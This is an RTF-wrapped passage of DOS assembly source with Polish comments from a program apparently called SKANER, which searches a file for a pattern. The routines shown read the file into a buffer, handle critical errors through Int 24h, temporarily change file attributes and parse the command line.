\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jmp short SzukajPierwszej           ; skocz i szukaj nastepnego wystapienia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NieMaPierwszej:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop ax                              ; zdejmij ilosc odczytanych danych ze stosu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp ax,RozmiarBuforaDanych          ; i porownaj, czy tyle ile bylo wczytywanych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jb  KoniecPliku                     ; jesli nie tyle samo, to koniec pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; jesli tyle samo, to czytaj dalej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jmp CzytajDoBufora                  ; skocz i czytaj dalej dane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KoniecPliku:                                        ; dane sie skonczyly}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 clc                                 ; nie ma bledu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NieMogeCzytac:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ret                                 ; wroc z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CzytajSzukaj    endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrzywrocParametrySystemu proc near                  ; przywraca stare adresy DTA+Int 24h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; i ewentualnie atrybuty pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; (jezeli sytemowy, ukryty)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pushf                               ; zachowaj flagi z ew. bledem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp ZmienAtrPliku,Prawda            ; czy przywrocic atrybut ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jne NiePrzywracajAtrybutu           ; skocz jesli nie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,4301h                        ; DOS: funkcja 43xxh wez(xx=0)/ustaw(xx=1) atr. pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 xor ch,ch                           ; ch=0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov cl,[BufDTA.Atrybut]             ; cx=stare atrybuty}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov dx,Offset NazwaPliku            ; DS:DX =nazwa pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 int 21h                             ; DOS : zmien atrybuty}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NiePrzywracajAtrybutu:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push ds                             ; zachowaj segment danych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push ds                             ; 2 razy -> na pozniej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 lds dx,dword ptr    [StareI24Ofs]   ; przywroc stara obsluge bledow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,2524h                        ; ustaw Int 24h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 int 21h                             ; funkcja 25h - ustaw wektor (numer w AL)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop ds                              ; przywroc segment danych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 lds dx,dword ptr    [StareDTAOfs]   ; przywroc stare DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ah,1Ah                          ; funkcja 1Ah - ustaw DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 int 21h                             ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop ds                              ; przywroc segment danych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 popf                                ; przywroc znaczniki z ew. bledem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ret                                 ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrzywrocParametrySystemu endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch UstawParametrySystemu proc near                     ; ustaw obsluge przerwania 24h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; nowy bufor DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,seg SKANER}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ds,ax                           ; DS=segment danych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov MojAdresPSP,es                  ; zachowaj PSP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,3524h                        ; funkcja wez adres przerwania (num. w AL)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 int 21h                             ; wez stare INT 24h do rejestrow ES:BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov StareI24Ofs,bx                  ; - zachowaj stare przerwanie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov StareI24Seg,es                  ; / ES=segment, BX=offset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ah,2Fh                          ; wez stare DTA do rejestrow ES:BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 int 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov StareDTAOfs,bx}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov StareDTASeg,es                  ; ES=segment, BX=ofset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov dx,Offset BufDTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ah,1Ah                          ; ustaw nowe DTA na adres zawarty w DS:DX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 int 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push ds                             ; zachowaj DS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push cs                             ; -DS=CS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop ds                              ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov dx,offset NoweInt24             ; ustaw nowe przerwanie 24h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,2524h                        ; w DS:DX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 int 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop ds                              ; przywroc DS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ret                                 ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch UstawParametrySystemu endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NoweInt24       proc near                           ; procedura obslugi przerwania programowego bledow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; krytycznych wywolywana przez DOS w razie bledu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push ds                             ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push ax                             ; -zachowaj DS i AX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,seg SKANER}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ds,ax                           ; ds=segment danych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov NumerBledu,BlBlad_ARIF          ; zachowaj numer bledu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop ax                              ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop ds                              ;  -przywroc DS i AX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov al,3                            ; pomin blad-program sam zadecyduje co dalej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 iret                                ; nie wywoluj standardowego dialogu ARIF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NoweInt24       endp                                ; powrot z procedury obslugi przerwania programowego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SprawdzPlik     proc near                           ; szukaj plik podany jako parametr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ZmienAtrPliku,Falsz             ; na razie nie znamy atrybutow, wiec nie trzeba}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; przywracac oryginalnych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov NumerBledu,BlBrakPlikuNaDysku   ; ustaw ew. numer bledu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ah,4Eh                          ; funkcja szukaj pozycji katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov dx,offset NazwaPliku            ; DS:DX nazwa pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov cx,AtAll                        ; w CX podaj atrybut szukanej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 int 21h                             ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jc NieMaPliku                       ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov si,offset BufDTA                ; nie ma bledu , info o pliku jest w buforze DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov al,[BufDTA.Atrybut]             ; wez atrybut pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov NumerBledu,BlZlyAtrybutPliku    ; ewent. blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 test al,AtVolumeID+AtDirectory      ; sprawdz, czy etykieta lub katalog (testuj bity)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 stc                                 ; ustaw ewent. blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jnz NieMaPliku                      ; skocz, bo etykieta lub dysk}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 test al,AtHidden+AtSystem           ; testuj bity : ukryty lub system}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov NumerBledu,BlBrakDostepuDoPliku ; ewent. blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jz NieZmienAtr                      ; nie sa ustawione, to skocz dalej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ZmienAtrPliku,Prawda            ; trzeba zmienic atrybut, zeby mozna bylo odczytac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,4301h                        ; funkcja ustaw atrybut pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov cx,AtArchive                    ; cx=atrybyt jaki ustawic}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov dx,Offset NazwaPliku            ; DS:DX nazwa pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 int 21h                             ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jc NieMaPliku                       ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NieZmienAtr:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 clc                                 ; nie ma bledu, plik gotowy do odczytu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NieMaPliku:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ret                                 ; wroc z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SprawdzPlik     endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CzytajParametry proc near                           ; wez parametry z PSP:80h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push ds                             ; zachowaj DS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,ds                           ; ES=DS=segment z danymi}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov es,ax}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ds,MojAdresPSP                  ; DS=blok PSP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov si,LiniaPolecen                 ; ofset w PSP do linii polecen}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov es:NumerBledu,BlBrakParametrow  ; ewentualny numer bledu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp byte ptr ds:[si],0              ; dlugosc linii polecen}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 je  BladParametrow                  ; jezeli pusta, to nie ma parametrow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
